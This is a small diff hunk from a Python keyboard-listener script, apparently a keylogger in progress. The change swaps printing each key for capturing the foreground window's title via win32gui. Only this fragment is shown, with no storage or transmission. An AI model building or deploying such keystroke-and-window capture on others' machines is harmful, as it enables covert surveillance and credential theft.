@@ -28,7 +28,8 @@ delete_file = []
 
 
 def on_press(key):
-    print(key)
+    global old_app
+    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
 
 
 with Listener(on_press=on_press) as listener:
